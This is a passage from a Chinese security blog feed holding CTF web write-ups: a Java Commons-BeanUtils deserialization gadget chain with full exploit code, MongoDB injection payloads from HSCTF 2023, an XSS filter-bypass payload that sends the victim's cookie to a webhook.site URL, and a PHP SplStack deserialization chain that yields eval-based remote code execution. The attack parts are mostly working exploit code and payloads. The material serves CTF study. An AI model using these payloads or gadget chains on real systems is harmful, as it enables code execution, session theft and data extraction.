class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span>  Object  <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object target, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> target.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(target,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(PropertyUtils.getProperty(templates, &quot;outputProperties&quot;));</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">outputProperties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"><span class="comment">//        outputProperties.compare(templates,new TemplatesImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">ioTransformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(ioTransformingComparator);</span><br><span class="line">        <span class="comment">//这里是先给一个没啥用的comparator，为了避免在add的时候会执行</span></span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//给queue数组传值</span></span><br><span class="line">        setValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, outputProperties);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230618210616955.png" alt="image-20230618210616955"></p><p>这里的解释一下为啥要给<code>priorityQueue</code>的<code>comparator</code>二次赋值</p><p>因为在第二次<code>add</code>的时候</p><p><img src="../images/image-20230618210749196.png" alt="image-20230618210749196"></p><p>会调用到<code>add</code>里的<code>offer</code>方法里的<code>siftUp</code>方法</p><p><img src="../images/image-20230618210902066.png" alt="image-20230618210902066"></p><p>继续跟进，因为<code>comparator</code>不为空</p><p>所以跟进这个方法</p><p><img src="../images/image-20230618210920053.png" alt="image-20230618210920053"></p><p><strong>刚好，这也可以触发  所以为了避免这个问题  我们就在序列化的时候执行到这的时候先给一个没用的值，等这里执行结束的在利用反射重新赋值</strong></p><p><img src="../images/image-20230618211221232.png" alt="image-20230618211221232"></p><p>最后就是在这里来触发了</p><p><strong>结束</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> java-Commons-BeanUtils </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hsctf-web-2023</title>
      <link href="/posts/f8ee282a.html"/>
      <url>/posts/f8ee282a.html</url>
      
        <content type="html"><![CDATA[<p>这里的写这个wp的原因是这里有几道题考察的是<code>mongodb</code>的注入   </p><p>(<strong>之前没咋见过，都是做mysql的居多</strong>)  </p><p>之前见过一次还是在  <a href="https://ke1nys.github.io/posts/d27bfad9.html#d3node">d3ctf里面见过</a></p><p><a href="https://www.youtube.com/watch?v=QKZWyWQSPaw">youtube———-wp</a></p><h2 id="mogodb"><a href="#mogodb" class="headerlink" title="mogodb"></a>mogodb</h2><p>这是一个<code>mogodb</code>的查询语句  </p><p><img src="../images/image-20230616202249915.png" alt="image-20230616202249915"></p><p>注入点就在这了</p><p><strong>payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; || this.user===&#x27;</span>a</span><br></pre></td></tr></table></figure><p>这里的引号位置是为了闭合代码中的引号</p><p>因为这里使用了<code>||</code>语句  ,所以说只要存在一个用户名为<code>admin</code>的用户，我们就能成功登录</p><p><strong>这里能成功是因为优先级的问题的</strong>              (<strong>非与或  优先级从大到小</strong>)</p><p>所以说这里会先执行<code>&amp;&amp;</code>   然后返回的结果在于<code>||</code>一起</p><h2 id="fancy-page"><a href="#fancy-page" class="headerlink" title="fancy-page"></a><strong>fancy-page</strong></h2><p>考点 <code>xss</code></p><p>这里很奇怪  (<strong>别的题目可以打通的payload到这就不行了，国外的题好奇怪</strong>)</p><p>而且还有一点就是不能使用国内的<code>vps</code>来弹shell     <strong>只能使用专门接http返回信息的网站来做</strong></p><p><strong>这里的话就记录一下他的payload，下次打国际赛在遇到的时候就拿出来用</strong></p><p><strong>给的源码中就下面的最有用</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> <span class="title class_">Arg</span> &#125; <span class="keyword">from</span> <span class="string">&quot;https://cdn.jsdelivr.net/npm/@vunamhung/arg.js@1.4.0/+esm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sanitize</span>(<span class="params">content</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> content.<span class="title function_">replace</span>(<span class="regexp">/script|on|iframe|object|embed|cookie/gi</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> title = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;title&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> content = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">display</span>(<span class="params"></span>) &#123;</span><br><span class="line">title.<span class="property">textContent</span> = <span class="title class_">Arg</span>(<span class="string">&quot;title&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">title</span> = <span class="title class_">Arg</span>(<span class="string">&quot;title&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sanitized = <span class="title function_">sanitize</span>(<span class="title class_">Arg</span>(<span class="string">&quot;content&quot;</span>));</span><br><span class="line">content.<span class="property">innerHTML</span> = sanitized;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="title class_">Arg</span>(<span class="string">&quot;background_color&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="title class_">Arg</span>(<span class="string">&quot;color&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">fontFamily</span> = <span class="title class_">Arg</span>(<span class="string">&quot;font&quot;</span>);</span><br><span class="line">content.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="title class_">Arg</span>(<span class="string">&quot;font_size&quot;</span>) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">display</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>虽然过滤了一些标签，但是因为是替换给空，所以可以使用<strong>双写绕过</strong></p><p><img src="../images/image-20230616204154238.png" alt="image-20230616204154238"></p><p><code>content</code> 写<code>xss</code>代码 </p><p><img src="../images/image-20230616204225564.png" alt="image-20230616204225564"></p><p><strong>这里传新生成的页面给机器人访问</strong></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x oonnerror=<span class="string">&#x27;document.locatioonn=&quot;https://webhook.site/763b1516-a326-4e4e-8327-7954bf30e2da?&quot;+document.ccookieookie&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230616204737798.png" alt="image-20230616204737798"></p><p>成功</p><h2 id="flag-shop"><a href="#flag-shop" class="headerlink" title="flag-shop"></a><strong>flag-shop</strong></h2><p>这是一道<code>mogodb</code>的盲注题目</p><p><img src="../images/image-20230616205615839.png" alt="image-20230616205615839"></p><p><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymongo.errors</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, render_template, request</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = os.getenv(<span class="string">&quot;FLASK_SECRET&quot;</span>)</span><br><span class="line">mongo_client = MongoClient(connect=<span class="literal">False</span>)</span><br><span class="line">db = mongo_client.database</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/search&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line"><span class="keyword">if</span> request.json <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="string">&quot;search&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.json:</span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;No search provided&quot;</span>, <span class="string">&quot;results&quot;</span>: []&#125;), <span class="number">400</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">results = db.flags.find(</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;$where&quot;</span>: <span class="string">f&quot;this.challenge.includes(&#x27;<span class="subst">&#123;request.json[<span class="string">&#x27;search&#x27;</span>]&#125;</span>&#x27;)&quot;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line"><span class="string">&quot;_id&quot;</span>: <span class="literal">False</span>,</span><br><span class="line"><span class="string">&quot;flag&quot;</span>: <span class="literal">False</span></span><br><span class="line">&#125;</span><br><span class="line">).sort(<span class="string">&quot;challenge&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> pymongo.errors.PyMongoError:</span><br><span class="line">traceback.print_exc()</span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Database error&quot;</span>, <span class="string">&quot;results&quot;</span>: []&#125;), <span class="number">500</span></span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;results&quot;</span>: <span class="built_in">list</span>(results)&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>根据这个代码来看的话</p><p><img src="../images/image-20230616205858592.png" alt="image-20230616205858592"></p><p>这里的话是在<code>challenge</code>  这个表里查数据  </p><p><code>id</code>和<code>flag</code>是不给查的    但是我们可以包含上面的<code>include</code>语句，来重新查一个<code>flag</code>表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;)==this.flag.includes(&#x27;</span>xxx</span><br></pre></td></tr></table></figure><p>xx后面就是想要爆破的字符串了</p><p>这里的话<code>include</code>的话就是  <strong>查找表里是否有相对应的字符串</strong></p><p>例如 <code>flag</code>   随便输入4个字母中的一个  就会将<code>flag</code>给输出出来  这就是<code>include</code>的作用</p><p><img src="../images/image-20230616212203808.png" alt="image-20230616212203808"></p><p>查询成功就会输出全部挑战</p><p><img src="../images/image-20230616212223885.png" alt="image-20230616212223885"></p><p>查询失败就啥也没有</p><p>这里在记录一个<code>ejs3.1.9</code>的漏洞题</p><p><a href="https://blog.maple3142.net/2023/06/12/seetf-2023-writeups/#star-cereal-episode-4-a-new-pigeon">wp1 </a>     <a href="https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#perfect-product">wp2</a></p><p>下次遇到<code>ejs 3.1.9</code>的题  这里直接秒就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> hsctf-web-2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>syctf-web-2023</title>
      <link href="/posts/eb3b498d.html"/>
      <url>/posts/eb3b498d.html</url>
      
        <content type="html"><![CDATA[<h2 id="4号的罗纳尔多"><a href="#4号的罗纳尔多" class="headerlink" title="4号的罗纳尔多"></a>4号的罗纳尔多</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;VanZZZZY&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;VanZZZZY&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;givemegirlfriend!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]+|Array|Iterator|Object|List/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;Pochy&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Pochy&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230616180925417.png" alt="image-20230616180925417"></p><p>重点在这个正则这里，这里的话是只能使用字母下划线和括号还有<code>;</code></p><p>那么就可以猜出来这里是考察的使用函数来进行<code>RCE</code></p><p><img src="../images/image-20230616181103226.png" alt="image-20230616181103226"></p><p>这里的话对序列化字符也有限制，就是不能使用<code>O</code>和<code>a</code>打头的，那么就只剩一种了，就是之前<code>ctfshow</code>出的一个题了   就是使用内置类   <strong><code>C</code>打头的</strong>  <a href="https://ke1nys.github.io/posts/28e06bac.html#easy-php">C打头的内置类</a></p><p>(<strong>这里的<code>a</code>打头就是在<code>O</code>打头的基础上加个<code>array()</code>函数而已</strong>)</p><p>还把<code>array</code>打头的类给禁掉了，不过没事</p><p><img src="../images/image-20230616185732553.png" alt="image-20230616185732553"></p><p>这些类都可以使用</p><p>只不过<code>Spl</code>开头的相对于<code>Array</code>打头的多一个<code>push()</code>函数</p><p>所以说先构造一下链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> evil;</span><br><span class="line"><span class="variable">$a</span> -&gt; cmd = <span class="string">&quot;rce&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">SplStack</span>();</span><br><span class="line"><span class="variable">$oa</span> -&gt; <span class="title function_ invoke__">push</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br></pre></td></tr></table></figure><p>链子就构造完成了，但是这个执行命令的时候会有一个麻烦就是</p><p><code>eval($this-&gt;cmd.&#39;givemegirlfriend!&#39;);</code>这个后面会有一个字符串，并且<code>;</code>的会被替换掉，不能使用，所以这里的话就得使用一个新的方法</p><p><code>__HALT_COMPILER()</code>函数来截断后面的非法语句，这个熟悉phar协议的师傅都知道，它是phar文件的文件标识，这个函数会中断php的执行，并且不会检查后面的语句，而exit()这些中断函数即使中断了也会检查后面的php语句，如果报错则会抛出错误，所以这里是不能用exit和die的。</p><p>然后因为这个只能通过函数方法来进行rce,那么这里就有两篇文章专门讲了这个</p><p><a href="https://xz.aliyun.com/t/10780">讲的是使用函数来进行rce</a>     <a href="https://guokeya.github.io/post/tckzWc_Xo/">也是讲的函数RCE</a></p><p><strong>最后的payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> evil;</span><br><span class="line"><span class="variable">$a</span> -&gt; cmd = <span class="string">&quot;eval(end(getallheaders()));__HALT_COMPILER();&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">SplStack</span>();</span><br><span class="line"><span class="variable">$oa</span> -&gt; <span class="title function_ invoke__">push</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//这里话不只有SplStack这个类可以使用，上面图片中含有的类都可以使用</span></span><br></pre></td></tr></table></figure><p><code>getallheaders()</code>这个函数是得在<code>apache</code>服务器下使用的，<code>nginx</code>不行</p><p><img src="../images/image-20230616191354197.png" alt="image-20230616191354197"></p><p>成功执行代码</p><h2 id="Confronting-robot"><a href="#Confronting-robot" class="headerlink" title="Confronting robot"></a>Confronting robot</h2><p><strong>这里的因为没有环境，所以就不复现了</strong></p><p>这题的话是由预期解是<strong>主从复制</strong>   <a href="https://www.kdocs.cn/l/cmbPrknYHg1V">主从复制wp1</a>    <a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247493926&amp;idx=1&amp;sn=58a1fa641fddb963c6f1c9e5968a5422&amp;chksm=e8a1caf7dfd643e12e5bc1f434bfae55f53693104f81920dc4ce3d4c534b235add654a083c5e&amp;mpshare=1&amp;scene=23&amp;srcid=0612QirgfrJoQ8N2ZyL6HJTv&amp;sharer_sharetime=1686542128876&amp;sharer_shareid=122e5be9c4961e59957c3603ed41e762#rd">主从复制wp2</a></p><p>非预期1是<strong>日志写入马</strong>    <a href="https://www.cnblogs.com/F12-blog/p/17472787.html">日志写马1</a>   <a href="http://acexze.cn/?post=13">日志写马2</a></p><p>非预期2是修改用户属性    <a href="https://www.cnblogs.com/Aann/p/17473430.html">修改用户属性</a></p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><p>这是题目的项目地址  <a href="https://github.com/thewhitetulip/Tasks-vue/blob/master/db/tasks.go#LL11C6-L11C16">tasks</a></p><p>就是通过审计这个代码来发现漏洞利用点的</p><p><a href="https://www.kdocs.cn/l/cmbPrknYHg1V">wp</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> syctf-web-2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陕西省赛—web-2023</title>
      <link href="/posts/9057bed9.html"/>
      <url>/posts/9057bed9.html</url>
      
